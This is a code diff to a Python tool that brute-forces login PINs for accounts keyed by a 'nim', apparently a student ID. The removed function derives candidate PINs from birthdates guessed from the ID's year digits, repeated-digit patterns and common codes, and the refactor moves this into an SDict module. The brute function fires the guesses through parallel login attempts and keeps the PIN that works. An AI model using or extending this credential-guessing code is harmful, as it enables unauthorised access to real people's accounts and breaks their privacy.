@@ -8,6 +8,7 @@ import logging          # logging
 import os               # os.remove
 
 from SLogin import SLogin
+from SDict import SDict
 
 
 def init_logging(logFileName):
@@ -26,51 +27,6 @@ def init_logging(logFileName):
     rootLogger.addHandler(consoleHandler)
 
     rootLogger.setLevel(logging.INFO)
-
-
-def init_dictionary(nim="160000000"):
-    """ generate dictionary customised for each nim.\n
-    dictionary generation took only < 0.01s so it is
-    better to customise for each nim, instead of
-    creating big dictionary at once """
-    nim = str(nim)
-    start_year = int(nim[:2]) + 81
-    end_year = int(nim[:2]) + 83
-
-    start_time = time.time()
-    dictionary = []
-    for yy in range(start_year, end_year+1):
-        for mm in range(1, 13):
-            for dd in range(1, 32):
-                if mm == 2 and dd > 29:
-                    continue
-                if mm in [2, 4, 6, 9, 11] and dd > 30:
-                    continue
-                date = {
-                    'dd': str(dd).zfill(2),
-                    'mm': str(mm).zfill(2),
-                    'yy': str(yy)[-2:]
-                }
-                dictionary.append("{dd}{mm}{yy}".format(**date))
-                dictionary.append("{yy}{mm}{dd}".format(**date))
-    for n in range(1000):
-        t = str(n)
-        dictionary.append(t * int(6 / len(t)))
-    for i in range(10):
-        dictionary.append(str(i).zfill(2)*3)
-        dictionary.append(str(i).zfill(3)*2)
-
-    # put extra values here
-    dictionary += [
-        "123456",
-        "654321",
-    ]
-    dictionary = sorted(list(set(dictionary)))
-    total_time = time.time()-start_time
-
-    logging.debug("Dictionary generated {} values in {:0.2f}s for {}"
-                  .format(len(dictionary), total_time, nim))
-    return dictionary
 
 
 def login(nim, pin, found, counter, depth=0):
@@ -93,7 +49,8 @@ def login(nim, pin, found, counter, depth=0):
                 depth += 1
                 return login(nim, pin, found, counter, depth)
             else:
-                logging.critical('Max Retry Exceeded for this exception: {}'.format(str(ex)))
+                logging.critical(
+                    'Max Retry Exceeded for this exception: {}'.format(str(ex)))
                 raise ex
         finally:
             counter.value = (
@@ -123,10 +80,9 @@ def brute(nim, process_count):
             logging.warning('Saved pin is bad, trying normal method.')
             os.remove(filename)
 
-    dictionary = init_dictionary(nim)
     with multiprocessing.Pool(process_count) as pool:
         result = list(pool.starmap(
-            login, [[nim, pin, found, counter] for pin in dictionary]))
+            login, [[nim, pin, found, counter] for pin in SDict(nim)]))
 
     result = list(set(result))
     result.remove(None)
